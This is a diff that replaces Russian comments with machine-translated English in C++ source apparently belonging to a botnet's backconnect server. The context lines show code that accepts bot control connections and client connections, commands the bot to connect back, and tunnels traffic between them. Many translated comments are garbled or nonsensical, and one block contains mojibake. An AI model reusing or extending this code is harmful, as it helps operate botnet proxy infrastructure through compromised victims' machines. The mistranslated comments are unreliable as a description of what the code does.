@@ -14,27 +14,27 @@
 #include "..\common\backconnect.h"
 #include "..\common\cui.h"
 
-//Максимальное время ожидания подключения сервиса бота на локальный порт в миллесекундах.
+//Maximum waiting time connection service bot on a local port in millesekundah.
 #define BCWAIT_TIMEOUT (10 * 60000)
 
 typedef struct
 {
-  SOCKET list[4]; //Сокеты в порядке ipv4 bot, ipv4 client, ipv6 bot, ipv6 client.
-  BYTE count;    //Реальное количетсво окрытых портов.
+  SOCKET list[4]; //Sockets in order ipv4 bot, ipv4 client, ipv6 bot, ipv6 client.
+  BYTE count;    //Real kolichetsvo an open, ports.
 }GENSOCKDATA;
 
 static HANDLE eventQuit;
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Работа с таблицей хэнделов.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Working with Handel's table.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  SOCKET client;         //Сокет клиента.
-  SOCKET bot;            //Сокет бота.
-  HANDLE connectedEvent; //Сигнал о подключении sBot.
-  DWORD id;              //ID элемента.
+  SOCKET client;         //Client socket.
+  SOCKET bot;            //Socket bot.
+  HANDLE connectedEvent; //Signal for connecting sBot.
+  DWORD id;              //ID of the element.
 }BCCCONNECT;
 
 static DWORD nextBccId;
@@ -87,7 +87,7 @@ static DWORD addBccConnect(SOCKET client)
   
   BCCCONNECT *newConnect = NULL;
 
-  //Обрезаем безполезную концовку.
+  //Cut the useless ending.
   while(bccListCount > 0 && bccList[bccListCount - 1].id == 0)bccListCount--;
   
   for(DWORD i = 0; i < bccListCount; i++)if(bccList[i].id == 0)
@@ -142,7 +142,7 @@ static void closeBccConnect(DWORD id)
     
     if(bccConnect != NULL)
     {
-      //см. freeBccConnect().
+      //see freeBccConnect ().
       WSocket::tcpClose(bccConnect->client);
       WSocket::tcpClose(bccConnect->bot);
       CWA(kernel32, CloseHandle)(bccConnect->connectedEvent);
@@ -152,7 +152,7 @@ static void closeBccConnect(DWORD id)
       bccConnect->connectedEvent = NULL;
       bccConnect->id             = 0;
       
-      //Обрезаем конец.
+      //Cut end.
       if(i + 1 == bccListCount)
       {
         if(--bccListCount == 0)
@@ -181,7 +181,7 @@ static DWORD WINAPI sockTunnel(void *p)
   
   HANDLE events[2];
   
-  //Получаем события.
+  //Receive events.
   CWA(kernel32, EnterCriticalSection)(&csBccConnect);
   BCCCONNECT *bccConnect = getBccConnect(id);
   if(bccConnect != NULL)
@@ -191,7 +191,7 @@ static DWORD WINAPI sockTunnel(void *p)
   }
   CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
   
-  //Ждем событий.
+  //We are waiting for events.
   if(bccConnect != NULL)
   {
     DWORD r = CWA(kernel32, WaitForMultipleObjects)(2, events, FALSE, BCWAIT_TIMEOUT);
@@ -214,7 +214,7 @@ static DWORD WINAPI sockTunnel(void *p)
         Console::writeFormatW(lng_listen_tunnel, id);
         WSocket::tcpTunnelAndWaitForWinEvent(s1, s2, eventQuit);
       }
-      //else //На самом деле сюда не реально попасть я так думаю.
+      //else / / In fact, this does not really get what I think.
     }
     else if(r == WAIT_TIMEOUT)Console::writeFormatW(lng_listen_id_timeout, id);
 
@@ -232,27 +232,27 @@ static DWORD WINAPI sockTunnel(void *p)
 static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
 {
   SOCKADDR_STORAGE sa;
-  WCHAR ipStr[MAX_PATH];                 //Текстовое представление IP.
-  SOCKET botMainSocket = INVALID_SOCKET; //Управляющее соединение.
+  WCHAR ipStr[MAX_PATH];                 //The textual representation of IP.
+  SOCKET botMainSocket = INVALID_SOCKET; //Control connection.
   ThreadsGroup::GROUP group;
   
   ThreadsGroup::_createGroup(&group);
 
   for(;;)
   {
-    //FIXME: WSAEventSelect().
+    //FIXME: WSAEventSelect ().
     SOCKET curSocket = WSocket::tcpWaitForEvent(gsd->list, gsd->count, 1000, NULL, 0);
 
-    //Ошибка.
+    //Error.
     if(curSocket == INVALID_SOCKET && CWA(ws2_32, WSAGetLastError)() != WSAETIMEDOUT)break;
     
-    //Проверка сообшения о выходе.
+    //Checking messages while on the output.
     if(CWA(kernel32, WaitForSingleObject)(eventQuit, 0) != WAIT_TIMEOUT)break;
     
-    //Таймаут.
+    //Timeout.
     if(curSocket == INVALID_SOCKET)continue;
 
-    //Получаем данные соединения.
+    //Obtain the data connection.
     int saSize = sizeof(SOCKADDR_STORAGE);
     SOCKET acceptedSocket = CWA(ws2_32, accept)(curSocket, (sockaddr *)&sa, &saSize);
     if(acceptedSocket != INVALID_SOCKET)
@@ -262,13 +262,13 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
       WSocket::ipToStringW(&sa, ipStr);
     }
     
-    //Сокеты для бота.
+    //Sockets for the bot.
     for(BYTE i = 0; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
     {
       if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_error_accept_bot, sizeof(lng_listen_error_accept_bot) / sizeof(WCHAR) - 1);
       else
       {
-        //Получаем команду.
+        //Obtain the team.
         Backconnect::COMMAND command;
         LPSTR commandData = NULL;
 
@@ -279,7 +279,7 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
           goto NEXT;
         }
         
-        //Это основное соединение. Закрываем старое.
+        //This is a basic compound. Close existing ones.
         if(command.command == Backconnect::COMMAND_BOTID)
         {
           WSocket::tcpClose(botMainSocket);
@@ -291,7 +291,7 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
             Mem::free(botId);
           }
         }
-        //Это сервисное соединение.
+        //This service connection.
         else if(command.command == Backconnect::COMMAND_IS_SERVICE && command.dataSize == sizeof(DWORD))
         {
           CWA(kernel32, EnterCriticalSection)(&csBccConnect);
@@ -318,15 +318,15 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
       goto NEXT;
     }
     
-    //Сокеты для клиента.
+    //Sockets for the client.
     for(BYTE i = 1; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
     {
       if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_faccept_client, sizeof(lng_listen_faccept_client) / sizeof(WCHAR) - 1);
-      //Если бот еше не подключен, отключаем клиента.
+      //If the bot have not yet connected, disable the client.
       else if(botMainSocket == INVALID_SOCKET)Console::writeFormatW(lng_listen_accept_bclient, ipStr);
       else
       {
-        //Сохраняем клиентский сокет.
+        //Save the client socket.
         DWORD id = addBccConnect(acceptedSocket);
         Console::writeFormatW(lng_listen_accept_client, ipStr, id);
         if(id > 0 && Backconnect::_writeCommand(botMainSocket, Backconnect::COMMAND_CONNECT, (LPBYTE)&id, sizeof(DWORD)))
@@ -334,7 +334,7 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
           if(!ThreadsGroup::_createThread(&group, 0, sockTunnel, (LPVOID)(DWORD_PTR)id, NULL, NULL))
           {
             Console::writeFormatW(lng_error_thread_failed, CWA(kernel32, GetLastError)());
-            closeBccConnect(id);//Внутри уже есть WSocket::tcpClose(acceptedSocket)
+            closeBccConnect(id);//Inside is already WSocket:: tcpClose (acceptedSocket)
           }
           ThreadsGroup::_closeTerminatedHandles(&group);
           goto NEXT;
@@ -343,7 +343,7 @@ static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
         {
           Console::writeFormatW(lng_listen_error_socket, CWA(ws2_32, WSAGetLastError)());
           
-          //Ошибка на управляющем сокете.
+          //Error on control socket.
           if(id > 0)
           {
             WSocket::tcpClose(botMainSocket);
@@ -362,7 +362,7 @@ NEXT:;
   
   WSocket::tcpClose(botMainSocket);  
   
-  //Закрытие сервисных нитей.
+  //Closure of the service wires.
   ThreadsGroup::_waitForAllExit(&group, INFINITE);
   ThreadsGroup::_closeGroup(&group);
 }
@@ -421,7 +421,7 @@ void commandListen(LPWSTR *switches, DWORD switchesCount)
 {  
   DWORD botPort, clientPort;
 
-  //Получение портов из командной строки.
+  //Getting the ports from the command line.
   {
     LPWSTR botPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_botport);
     LPWSTR clientPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_clientport);
@@ -451,15 +451,15 @@ void commandListen(LPWSTR *switches, DWORD switchesCount)
   bool ipv4 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv4) == (LPWSTR)1);
   bool ipv6 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv6) == (LPWSTR)1);
 
-  /*    
-    Указание протокола по умолчанию.
-    
-    В далеком будущем, когда основным протоколом станет ipv6, необходимо заменить эту строку
-    соответсвенно.
-  */
+  /*В В В В 
+В В В В Specifying the default protocol.
+В В В В 
+В В В В In the distant future, when the basic protocol would ipv6, needs to be replaced this line
+В В В В respectively.
+В В */
   if(!ipv4 && !ipv6)ipv4 = true;
   
-  //Создаем сокеты.
+  //Create a socket.
   GENSOCKDATA gsd;
   Mem::_zero(&gsd, sizeof(GENSOCKDATA));
 
@@ -479,7 +479,7 @@ void commandListen(LPWSTR *switches, DWORD switchesCount)
     gsd.count += 2;
   }
 
-  //Проверяем успешно ли созданы все сокеты.
+  //Checking whether successfully created all the sockets.
   for(BYTE i = 0; i < gsd.count; i++)if(gsd.list[i] == INVALID_SOCKET)
   {
     coreData.exitCode = Cui::EXITCODE_ERROR_SOCKET;
